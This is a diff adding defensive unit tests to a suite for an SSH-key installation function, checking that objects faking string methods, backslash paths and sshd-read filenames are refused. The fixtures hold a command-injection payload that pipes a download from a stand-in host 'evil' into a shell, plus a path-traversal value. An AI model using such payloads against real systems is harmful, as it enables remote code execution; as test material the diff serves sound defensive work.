@@ -129,6 +129,39 @@ describe("addKeyToHost", () => {
     expect(sshExecCommand).not.toHaveBeenCalled();
   });
 
+  it("refuses a non-string location or filename that fakes the string methods", async () => {
+    // Plugins run in-process and are handed the API object itself, so the
+    // TypeScript signature is not a runtime guarantee: this object satisfies
+    // startsWith/split/includes and would reach shellQuote, which would then
+    // call its own `replace` and inject a second command.
+    const hostileLocation = {
+      startsWith: () => false,
+      split: () => ["ssh"],
+      includes: () => false,
+      replace: () => "'; curl http://evil | sh; echo '",
+    } as unknown as string;
+    await expect(addKeyToHost({ sshKey, connection, location: hostileLocation })).rejects.toThrow();
+    await expect(addKeyToHost({ sshKey, connection, filename: hostileLocation })).rejects.toThrow();
+    expect(sshExecCommand).not.toHaveBeenCalled();
+  });
+
+  it("stringifies a hostile key name instead of calling its own replace", async () => {
+    const hostileName = { replace: () => "'; curl http://evil | sh; echo '", toString: () => "plain" };
+    await addKeyToHost({ sshKey: { id: "k1", name: hostileName } as any, connection });
+    const { command } = sshExecCommand.mock.calls[0][0] as any;
+    expect(command).toContain("'# plain Key by Voltius'");
+    expect(command).not.toContain("curl http://evil");
+  });
+
+  it("refuses a backslash in the path and a filename sshd itself interprets", async () => {
+    await expect(addKeyToHost({ sshKey, connection, location: "..\\..\\rc" })).rejects.toThrow();
+    // ~/.ssh/rc and ~/.ssh/environment are read by sshd at login. The comment
+    // charset is what makes an append inert; this is the tripwire around it.
+    await expect(addKeyToHost({ sshKey, connection, filename: "rc" })).rejects.toThrow();
+    await expect(addKeyToHost({ sshKey, connection, filename: "environment" })).rejects.toThrow();
+    expect(sshExecCommand).not.toHaveBeenCalled();
+  });
+
   it("still accepts the panel's own defaults and a nested relative location", async () => {
     await addKeyToHost({ sshKey, connection, location: ".ssh", filename: "authorized_keys" });
     await addKeyToHost({ sshKey, connection, location: ".ssh/keys.d", filename: "voltius" });
